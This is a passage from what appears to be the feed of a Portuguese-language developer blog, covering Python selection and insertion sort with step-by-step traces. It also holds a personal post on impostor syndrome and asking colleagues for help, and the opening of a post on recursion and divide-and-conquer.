&lt;span class="sd"&gt;        - Faz swap `0` (`i`) e `1` (`min_index`)&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 3, 2, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `1` e `min_index` é `1`. Entra no segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `2`. `array[1]` é maior que `array[2]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `min_index` é `2`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `3`. `array[2]` não é maior que `array[3]`&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Faz swap `1` (`i`) e `2` (`min_index`)&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 2, 3, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `2` e `min_index` é `2`. Entra no segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `3`. `array[2]` não é maior que `array[3]`&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Faz swap `2` (`i`) e `2` (`min_index`)&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `3` e `min_index` é `3`. Não entra no segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Faz swap `3` (`i`) e `3` (`min_index`)&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do primeiro laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array ordenado&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;min_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;min_index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
                &lt;span class="n"&gt;min_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;

        &lt;span class="n"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;min_index&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Ao alterar o array in-place, não há reais motivos para retorná-lo&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Running-time complexity&lt;/em&gt;: Ao percebermos os dois &lt;em&gt;loops&lt;/em&gt; alinhados, percorrendo a dimensão do &lt;em&gt;array&lt;/em&gt; cada, podemos concluir que a complexidade é de &lt;code&gt;O(n^2)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Space complexity&lt;/em&gt;: Como operamos a troca de elementos (&lt;code&gt;swap&lt;/code&gt;), não precisamos de nenhuma outra estrutura de dados para armazenar o resultado da operação, com isso, temos complexidade de espaço de &lt;code&gt;O(1)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Insertion sort&lt;/h2&gt;
&lt;p&gt;Para finalizar essa primeira parte do artigo, apresentamos o &lt;em&gt;Insertion sort&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/algoritmos-insertion-sort.gif" width="300" height="180" title="Passos do Insertion sort (wikipedia.org)" alt="Passos do Insertion sort (wikipedia.org)"&gt;&lt;/p&gt;
&lt;p&gt;Embora ele se compare aos dois algoritmos acima em &lt;em&gt;running time&lt;/em&gt;, na minha opinião, imaginar o seu funcionamento demanda um pouquinho mais de esforço. Nesse algoritmo, o propósito é achar o lugar onde o elemento deveria estar no &lt;em&gt;array&lt;/em&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Para cada elemento &lt;code&gt;A[i]&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Se &lt;code&gt;A[i] &amp;gt; A[i + 1]&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Troque os elementos até &lt;code&gt;A[i] &amp;lt;= A[i + 1]&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Abaixo a implementação em &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;insertion_sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Teste de mesa&lt;/span&gt;
&lt;span class="sd"&gt;    -------------&lt;/span&gt;

&lt;span class="sd"&gt;    array = []:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `0`, não cai no laço `for` e retorno array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `1`, mas `range(1, len(array))` resulta em `[]`&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1, 2]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `2`, entra no laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `slot` é `1`. `value` é `2` e `test_slot` é `0`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é maior que `-1`, mas `array[0]` não é maior que `2`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[1]` recebe `2` (mesmo valor)&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [3, 1, 2, 4]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `4`, entra no laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `slot` é `1`, `value` é `1` e `test_slot` é `0`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é maior que `-1` e `array[0]` é maior que `1`. Entra no laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[1]` recebe `array[0]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é `-1`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [3, 3, 2, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` não é maior que `-1`. Sai do laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[0]` recebe `1`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 3, 2, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `slot` é `2`, `value` é `2` e `test_slot` é `1`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é maior que `-1` e `array[1]` é maior que `2`. Entra no laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[2]` recebe `3`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é `0`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 3, 3, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é maior que `-1`, mas `array[0]` não é maior que `2`. Sai do laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[1]` recebe `2`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 2, 3, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `slot` é `3`, `value` é `4` e `test_slot` é `2`&lt;/span&gt;
&lt;span class="sd"&gt;        - `test_slot` é maior que `-1`, mas `array[2]` não é maior que `4`. Não entra no laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `array[3]` recebe `4` (mesmo valor). Sai do laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array ordenado&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;slot&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;slot&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;slot&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;test_slot&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;test_slot&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

        &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;test_slot&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

    &lt;span class="c1"&gt;# Ao alterar o array in-place, não há reais motivos para retorná-lo&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Running-time complexity&lt;/em&gt;: No melhor cenário, o algoritmo terá complexidade &lt;code&gt;O(n)&lt;/code&gt;. O mesmo apresenta complexidade &lt;code&gt;O(n^2)&lt;/code&gt; como pior cenário.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Space complexity&lt;/em&gt;: Como operamos a troca de elementos (&lt;code&gt;swap&lt;/code&gt;), não precisamos de nenhuma outra estrutura de dados para armazenar o resultado da operação, com isso, temos complexidade de espaço de &lt;code&gt;O(1)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Os algoritmos listados nesse artigo não possuem performance atrativa, mas são a escolha perfeita para introduzir o conceito de algoritmos e ordenação de elementos. E por mais que você sinta-se tentado a defender a ótima característica de &lt;em&gt;space complexity&lt;/em&gt; que eles possuem, ainda assim há soluções mais práticas para os problemas de ordenação do cotidiano.&lt;/p&gt;
&lt;p&gt;Nos próximos artigos vamos explorar algumas delas, como o &lt;em&gt;Merge&lt;/em&gt; e &lt;em&gt;Quicksort&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://brilliant.org/wiki/bubble-sort/"&gt;Brilliant - Bubble sort&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://brilliant.org/wiki/insertion/"&gt;Brilliant - Insertion sort&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://brilliant.org/wiki/sorting-algorithms/"&gt;Brilliant - Sorting Algorithms&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.geeksforgeeks.org/selection-sort/"&gt;GeeksForGeeks - Selection sort&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@george.seif94/a-tour-of-the-top-5-sorting-algorithms-with-python-code-43ea9aa02889"&gt;George Seif - A tour of the top 5 sorting algorithms with Python code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.khanacademy.org/computing/computer-science/algorithms/sorting-algorithms/a/selection-sort-pseudocode"&gt;Khan Academy - Selection sort&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cs.cmu.edu/~adamchik/15-121/lectures/Sorting%20Algorithms/sorting.html"&gt;Victor S. Adamchick - Sorting&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Bubble_sort"&gt;Wikipedia - Bubble sort&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Insertion_sort"&gt;Wikipedia - Insertion sort&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="estrutura-de-dados"></category><category term="ordenacao"></category><category term="algoritmos"></category></entry><entry><title>Peça ajuda!</title><link href="https://klauslaube.com.br/2019/04/30/peca-ajuda.html" rel="alternate"></link><published>2019-04-30T17:30:00-03:00</published><updated>2019-04-30T17:30:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-04-30:/2019/04/30/peca-ajuda.html</id><summary type="html">&lt;p&gt;Desde que assisti ao (razoável) &lt;a href="https://www.imdb.com/title/tt0480249/" title="I Am Legend"&gt;Eu Sou a Lenda&lt;/a&gt;, uma pergunta instalou-se em minha cabeça: E se eu fosse o último ser humano vivo depois de um apocalipse zumbi? Alguns bons anos depois da estreia do filme, posso dizer com toda a sobriedade que, se eu o fosse, seria por …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Desde que assisti ao (razoável) &lt;a href="https://www.imdb.com/title/tt0480249/" title="I Am Legend"&gt;Eu Sou a Lenda&lt;/a&gt;, uma pergunta instalou-se em minha cabeça: E se eu fosse o último ser humano vivo depois de um apocalipse zumbi? Alguns bons anos depois da estreia do filme, posso dizer com toda a sobriedade que, se eu o fosse, seria por muita sorte, e possivelmente não viveria muito tempo mais.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Quantas pessoas é preciso para construir um lápis?&lt;/h2&gt;
&lt;p&gt;As vezes esquecemos que no mundo globalizado em que vivemos, é muito raro sermos os únicos agentes por trás de uma ideia ou produto. O lápis, que você usa diariamente e nem nota a tamanha importância que tem, &lt;a href="https://www.sucessonetwork.com.br/licoes-aprenda-com-o-lapis-e-como-construir-confianca-por-gilberto-suzuki/" title="Aprenda com o Lápis e Como construir confiança"&gt;passou pela mão de centenas de pessoas&lt;/a&gt; antes de chegar à sua mesa. Não é incomum olharmos algo simples, e automaticamente assumirmos como fácil.&lt;/p&gt;
&lt;p&gt;Algumas semanas atrás eu estava enfrentando uma daquelas tarefas "toca do coelho da Alice". Na primeira estimativa do time parecia algo trivial, de baixa complexidade. Com o tempo, e descobrindo mais sobre os requisitos (de produto e técnicos), a complexidade foi crescendo exponencialmente. Logo, aquele &lt;em&gt;ticket&lt;/em&gt; que teoricamente seria resolvido em uma iteração, estava em seu terceiro &lt;em&gt;sprint&lt;/em&gt;, e sem grandes perspectivas de acabar.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/help-starwars.jpeg" width="630" height="354" title="Help me, Obi-Wan (starwars.com)" alt="Help me, Obi-Wan (starwars.com)"&gt;&lt;/p&gt;
&lt;p&gt;Cada &lt;em&gt;daily meeting&lt;/em&gt; era uma tortura. Era como reconhecer que eu estava falhando como desenvolvedor, e que não tinha a capacidade de entregar uma história teoricamente simples. O medo de mostrar vulnerabilidade trouxe a necessidade de ser menos transparente em relação aos reais motivos por trás do atraso. No fim, só conseguia enxergar que eu era o culpado por todo aquele atraso, e que era o fim da linha para mim como desenvolvedor na empresa que eu havia acabado de ingressar.&lt;/p&gt;
&lt;p&gt;Era como correr de um zumbi, sem realmente ter um plano para escapar dele.&lt;/p&gt;
&lt;h2&gt;A Síndrome do Impostor ou Efeito Dunning-Kruger?&lt;/h2&gt;
&lt;p&gt;Nem preciso dizer que toda essa dinâmica resultou em picos altíssimos de ansiedade, e quando menos percebi estava preso no círculo vicioso da &lt;a href="https://pt.wikipedia.org/wiki/Síndrome_do_impostor" title="Leia mais no Wikipedia"&gt;Síndrome do Impostor&lt;/a&gt;. Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As pessoas que sofrem este tipo de síndrome, de forma permanente, temporária ou frequente, parecem incapazes de internalizar os seus feitos na vida. Não importando o nível de sucesso alcançado em sua área de estudo ou trabalho, ou quaisquer que sejam as provas externas de suas competências, essas pessoas permanecem convencidas de que não merecem o sucesso alcançado e que de fato são nada menos do que fraudes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O medo de descobrirem a "fraude" me colocou na defensiva. Uma cortina de fumaça. Se eu conseguisse resolver aquele problema, sem ajuda nenhuma, eu ganharia tempo, e todo esse episódio seria esquecido.&lt;/p&gt;
&lt;p&gt;Hoje fica fácil olhar para trás e reconhecer que na época, eu tinha pouca experiência com a plataforma &lt;em&gt;Java&lt;/em&gt;, e que eu deveria adicionar isso como argumento no momento da estimativa. Eu "achava que sabia o que eu não sabia", uma espécie de &lt;a href="https://pt.wikipedia.org/wiki/Efeito_Dunning-Kruger" title="Leia mais no Wikipedia"&gt;Efeito Dunning-Kruger&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) é o fenômeno pelo qual indivíduos que possuem pouco conhecimento sobre um assunto acreditam saber mais que outros mais bem preparados, fazendo com que tomem decisões erradas e cheguem a resultados indevidos; é a sua incompetência que os restringe da habilidade de reconhecer os próprios erros. Estas pessoas sofrem de superioridade ilusória.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;"Isso é fácil! Resolvo em um sprint, sem dúvida. Sou um excelente desenvolvedor".&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/help-zombieland.jpg" width="625" height="265" title="Não! Não seja um herói! (anythingzombie.com)" alt="Não! Não seja um herói! (anythingzombie.com)"&gt;&lt;/p&gt;
&lt;p&gt;É essa mesma superioridade ilusória que faz você acreditar que sim, sobreviveria a um &lt;em&gt;outbreak&lt;/em&gt; zumbi.&lt;/p&gt;
&lt;h2&gt;Somos um exército de um homem só&lt;/h2&gt;
&lt;p&gt;Só aprendi a controlar o ego através da "dor". Somente após viver cercado de profissionais muito mais capazes do que eu o era, e que diariamente me provocavam um &lt;em&gt;reality check&lt;/em&gt;. Em algum momento desse período eu compreendi que era mais fácil adotar uma postura humilde, me aproximar de tais profissionais, e aprender o que fosse possível com eles.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/help-i-am-legend.jpg" width="740" height="416" title="Nem Will Smith aguenta sozinho (looper.com)" alt="Nem Will Smith aguenta sozinho (looper.com)"&gt;&lt;/p&gt;
&lt;p&gt;Mas a competividade no setor de Tecnologia da Informação é alta, e isso pode resultar em ambientes tóxicos. Empresas que não te permitem errar, que possuem um sistema de evolução de carreira baseado somente em avaliações 360 e produtividade, ou colegas de trabalho que pecam em &lt;em&gt;soft skills&lt;/em&gt; com um "como é que você não sabe isso?". Pedir ajuda em um ambiente como esse não é nada atrativo, e o empenho de resolver um problema sozinho pode parecer mais recompensador.&lt;/p&gt;
&lt;p&gt;Mas a dura realidade é que, mesmo que você sobreviva ao &lt;em&gt;outbreak&lt;/em&gt; zumbi, você não seria capaz de fabricar um lápis sozinho.&lt;/p&gt;
&lt;h2&gt;Help!&lt;/h2&gt;
&lt;p&gt;Como eu resolvi o meu problema? Pedindo ajuda, claro.&lt;/p&gt;
&lt;p&gt;Tenho o privilégio de trabalhar na Dinamarca atualmente, um país com níveis de &lt;em&gt;work-life balance&lt;/em&gt; impressionantes. Grande parte dos meus colegas de trabalho têm por filosofia de vida o "existe vida lá fora" com pitadas de "não se leve tão a sério" e "você não é o seu crachá". O que resulta em um ambiente de trabalho relativamente leve, te dando segurança para mostrar suas vulnerabilidades, e de aprender com os próprios erros.&lt;/p&gt;
&lt;p&gt;Ser vulnerável não é algo ruim. Sair da zona de conforto e "lutar a boa luta" exige energia, exige movimento, proatividade. Quebre esse círculo vicioso da insegurança e peça ajuda!&lt;/p&gt;
&lt;h2&gt;Antes de ir&lt;/h2&gt;
&lt;p&gt;A grande lição que fica disso é que, ao se levar muito a sério, você deixa de fazer algo que deveria ser muito comum no meio &lt;em&gt;Agile&lt;/em&gt;: Errar.&lt;/p&gt;
&lt;p&gt;Se você estiver nadando em um mar de angústia e ansiedade, espero que esse depoimento te motive a quebrar o círculo vicioso, e a pedir ajuda. Não há "desonra" nisso, e bobear você aprende algo novo por tabela.&lt;/p&gt;
&lt;p&gt;Permita-se "ligar o fod*-se" de vez em quando.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.boanoiteinternet.com.br/"&gt;Boa Noite Internet - Um podcast procurando respostas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="profissao"></category><category term="carreira"></category><category term="desenvolvedor"></category><category term="sindrome-impostor"></category></entry><entry><title>Recursividade e o "dividir e conquistar"</title><link href="https://klauslaube.com.br/2019/03/25/recursividade-e-dividir-e-conquistar.html" rel="alternate"></link><published>2019-03-25T18:55:00-03:00</published><updated>2019-03-25T18:55:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-03-25:/2019/03/25/recursividade-e-dividir-e-conquistar.html</id><summary type="html">&lt;p&gt;Sabe aquelas pessoas que têm problemas em determinar qual lado é o "esquerdo" e qual lado é o "direito"?
Admito, sem orgulho algum, que tenho o mesmo problema com recursividade. Meu cérebro simplesmente se embaralha,
e preciso fazer um grande esforço para imaginar o que está acontecendo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;A boa notícia …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sabe aquelas pessoas que têm problemas em determinar qual lado é o "esquerdo" e qual lado é o "direito"?
Admito, sem orgulho algum, que tenho o mesmo problema com recursividade. Meu cérebro simplesmente se embaralha,
e preciso fazer um grande esforço para imaginar o que está acontecendo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;A boa notícia é que assim como usar a mão do relógio (ou a mão que você escreve) ajuda a determinar o que é esquerda e direita, é possível utilizar alguns padrões de escrita de código para ajudar a entender o que está acontecendo em um algoritmo com recursividade.&lt;/p&gt;
&lt;p&gt;Mas como só a receita de bolo não basta... senta que lá vem história.&lt;/p&gt;
&lt;h2&gt;Napoleão style!&lt;/h2&gt;
&lt;p&gt;O "Dividir e Conquistar" (ou &lt;em&gt;Divide and Conquer&lt;/em&gt;), assim como os &lt;a href="https://klauslaube.com.br/2019/01/27/os-greedy-algorithms.html" title="Os Greedy algorithms"&gt;&lt;em&gt;Greedy algorithms&lt;/em&gt;&lt;/a&gt;, é um paradigma para construção de algoritmos (&lt;em&gt;algorithmic paradigm&lt;/em&gt;), onde a ideia é resolver um determinado problema utilizando três passos diferentes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dividir: Quebre um determinado problema em subproblemas do mesmo tipo;&lt;/li&gt;
&lt;li&gt;Conquistar: Resolva esses subproblemas de forma recursiva;&lt;/li&gt;
&lt;li&gt;Combinar: Combine as respostas apropriadamente.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Algoritmos de ordenação famosos, como o &lt;em&gt;Quicksort&lt;/em&gt; e o &lt;em&gt;Merge Sort&lt;/em&gt;, utilizam esse paradigma para apresentar soluções com performance ótima.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/divide-and-conquer-napoleon.jpg" width="600" height="300" title="Não! Não esse Napoleon... (youtube.com)" alt="Não! Não esse Napoleon... (youtube.com)"&gt;&lt;/p&gt;
&lt;p&gt;Compreender essa estrutura é um bom passo para dominar funções recursivas. Na verdade, a utilização de recursividade parte do princípio que você seja capaz de quebrar um grande problema em problemas menores (e semelhantes). No fim, os dois conceitos se completam e é difícil imaginar um sem o outro. O &lt;a href="https://www.tutorialspoint.com/data_structures_algorithms/divide_and_conquer.htm" title="Data Structures - Divide and Conquer"&gt;&lt;em&gt;tutorialspoint&lt;/em&gt;&lt;/a&gt; reforça essa idea:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In divide and conquer approach, the problem in hand, is divided into smaller sub-problems and then each problem is solved independently. When we keep on dividing the subproblems into even smaller sub-problems, we may eventually reach a stage where no more division is possible. Those "atomic" smallest possible sub-problem (fractions) are solved. The solution of all sub-problems is finally merged in order to obtain the solution of an original problem.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Não será surpresa se vermos a mesma receita se repetir pelo resto desse &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Uma função que chama a si mesmo&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://pt.wikibooks.org/wiki/Algoritmos_e_Estruturas_de_Dados/Recursividade" title="Algoritmos e Estruturas de Dados/Recursividade"&gt;&lt;em&gt;Wikibooks&lt;/em&gt;&lt;/a&gt; explica de forma muito clara o que é recursividade:&lt;/p&gt;
&lt;blockquote&gt;
